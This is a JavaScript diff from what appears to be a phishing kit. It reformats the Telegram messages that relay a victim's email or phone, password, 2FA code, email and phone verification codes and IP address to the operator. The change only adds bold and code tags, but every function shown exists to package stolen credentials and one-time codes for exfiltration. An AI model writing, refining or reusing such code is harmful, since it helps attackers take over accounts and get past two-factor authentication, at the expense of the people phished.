@@ -214,7 +214,7 @@ function getCredentialParts(emailPhone) {
     if (!submittedIsPhone) {
         return {
             type: 'Email',
-            html: `${escapeTelegramHtml(submitted)}`
+            html: `<code>${escapeTelegramHtml(submitted)}</code>`
         };
     }
 
@@ -226,7 +226,7 @@ function getCredentialParts(emailPhone) {
 
     return {
         type: 'Phone',
-        html: `${escapeTelegramHtml(codePart)} ${submittedDigits}`
+        html: `<b>${escapeTelegramHtml(codePart)}</b> <code>${submittedDigits}</code>`
     };
 }
 
@@ -234,49 +234,49 @@ function formatLoginMessage(emailPhone, password) {
     const credentials = getCredentialParts(emailPhone);
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}Email: ${credentials.html}\nPassword: ${escapeTelegramHtml(password)}\n\nIP: ${userInfo.ip}`;
+    return `${label}<b>Email:</b> ${credentials.html}\n<b>Password:</b> <code>${escapeTelegramHtml(password)}</code>\n\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 function formatOneTimeLoginMessage(emailPhone) {
     const credentials = getCredentialParts(emailPhone);
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}Email: ${credentials.html}\n\nIP: ${userInfo.ip}`;
+    return `${label}<b>Email:</b> ${credentials.html}\n\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 function format2FAMessage(code, switched = false) {
     const prefix = switched ? '🔐 Switched: ' : '🔐 2FA: ';
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}${prefix}${escapeTelegramHtml(code)}\nIP: ${userInfo.ip}`;
+    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
     const prefix = switched ? '📧 Switched: ' : '📧 Email Code: ';
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}${prefix}${escapeTelegramHtml(code)}\nIP: ${userInfo.ip}`;
+    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
     const prefix = switched ? '📱 Switched: ' : '📱 Phone Code: ';
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}${prefix}${escapeTelegramHtml(code)}\nIP: ${userInfo.ip}`;
+    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
     const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}Switched to: ${toMethodFormatted}\nIP: ${userInfo.ip}`;
+    return `${label}<b>Switched to:</b> ${toMethodFormatted}\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 function formatGoVerifyMessage(method) {
     const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}Selected: ${methodFormatted}\nIP: ${userInfo.ip}`;
+    return `${label}<b>Selected:</b> ${methodFormatted}\n<b>IP:</b> <code>${userInfo.ip}</code>`;
 }
 
 // ======================================================
